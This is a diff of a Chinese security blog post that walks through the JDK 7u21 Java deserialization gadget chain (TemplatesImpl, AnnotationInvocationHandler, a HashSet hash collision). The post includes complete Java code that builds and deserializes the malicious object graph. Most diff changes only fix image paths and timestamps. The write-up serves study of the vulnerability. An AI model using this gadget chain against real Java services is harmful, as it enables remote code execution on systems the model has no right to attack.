@@ -29,18 +29,18 @@
 <meta property="og:site_name" content="ctwabc&#39;s Blog">
 <meta property="og:description" content="这条链是JDK原生的链子，只需要JDK。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://ctwabc.github.io/7u21/7u211.png">
-<meta property="og:image" content="http://ctwabc.github.io/7u21/7u212.png">
-<meta property="og:image" content="http://ctwabc.github.io/7u21/7u213.png">
-<meta property="og:image" content="http://ctwabc.github.io/7u21/7u214.png">
-<meta property="og:image" content="http://ctwabc.github.io/7u21/7u215.png">
-<meta property="og:image" content="http://ctwabc.github.io/7u21/7u216.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/08/31/7u21/7u211.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/08/31/7u21/7u212.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/08/31/7u21/7u213.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/08/31/7u21/7u214.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/08/31/7u21/7u215.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/08/31/7u21/7u216.png">
 <meta property="article:published_time" content="2026-08-31T02:53:49.000Z">
-<meta property="article:modified_time" content="2026-08-31T06:23:17.341Z">
+<meta property="article:modified_time" content="2026-08-31T06:26:57.876Z">
 <meta property="article:author" content="ctwabc">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://ctwabc.github.io/7u21/7u211.png">
+<meta name="twitter:image" content="http://ctwabc.github.io/2026/08/31/7u21/7u211.png">
 
 <link rel="canonical" href="http://ctwabc.github.io/2026/08/31/7u21/">
 
@@ -215,7 +215,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2026-08-31 10:53:49 / 修改时间：14:23:17" itemprop="dateCreated datePublished" datetime="2026-08-31T10:53:49+08:00">2026-08-31</time>
+              <time title="创建时间：2026-08-31 10:53:49 / 修改时间：14:26:57" itemprop="dateCreated datePublished" datetime="2026-08-31T10:53:49+08:00">2026-08-31</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -250,22 +250,22 @@
 
 <p>这条链走的是TemplatesImpl，从newTransformer()开始后面的部分都是之前那个路子，区别就是怎么走到newTransformer()。</p>
 <p><em><strong>流程分析</strong></em></p>
-<p><img src="/./7u21/7u211.png"></p>
+<p><img src="/2026/08/31/7u21/7u211.png"></p>
 <p>这个方法会扫描AnnotationInvocationHandler的属性type的所有方法，而这个type是创建AnnotationInvocationHandler时设置的接口的类。这样就能调用上newTransformer()这个方法了。</p>
 <p>所以思路就是想办法让动态代理类调用方法。最后通过中转走到这里。</p>
-<p><img src="/./7u21/7u212.png"></p>
+<p><img src="/2026/08/31/7u21/7u212.png"></p>
 <p>看这个invoke就知道，他是根据动态代理类调用的方法的名字选择要调用的方法的。所以说要让这个动态代理类调用equals方法。</p>
 <p>链首不清楚是怎么找的不过知道是HashSet大概就懂了，触发哈希冲突的调用上equals方法。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ctw/JavaClasses/Test7u21.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodeField.set(templates, codes);</span><br><span class="line">        </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;f5a5a608&quot;</span>, templates);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        java.lang.reflect.<span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Templates.class, hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        hashSet.add(templates);</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(hashSet);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>下面开始调试</p>
-<p><img src="/./7u21/7u213.png"></p>
+<p><img src="/2026/08/31/7u21/7u213.png"></p>
 <p>首先要知道HashSet是通过HashMap来实现的，他会将数据储存到HashMap中，在这个键值对值就PRESENT，没有意义纯粹是为了凑数。</p>
-<p><img src="/./7u21/7u214.png"></p>
+<p><img src="/2026/08/31/7u21/7u214.png"></p>
 <p>反序列化到HashSet的第一个数据的时候是不会进入到for循环的，因为table还是空的，再将第二个动态代理对象放进去的时候才会走到for循环，当然还得满足其他要求，首先是这个下标i要相同，为此hash要相同。</p>
-<p><img src="/./7u21/7u215.png"></p>
+<p><img src="/2026/08/31/7u21/7u215.png"></p>
 <p>这个hashCode方法会到动态代理的hashCodeImpl</p>
-<p><img src="/./7u21/7u216.png"></p>
+<p><img src="/2026/08/31/7u21/7u216.png"></p>
 <p>这一部分其实就是数学上的处理<code>&quot;f5a5a608&quot;, templates</code>总的来说这个键值对的hashcode相当于templates的hashcode，因为计算&#96;”f5a5a608”的hashCode的话是0。这样就能走到key.equals了，后面都是老样子。</p>
 
     </div>
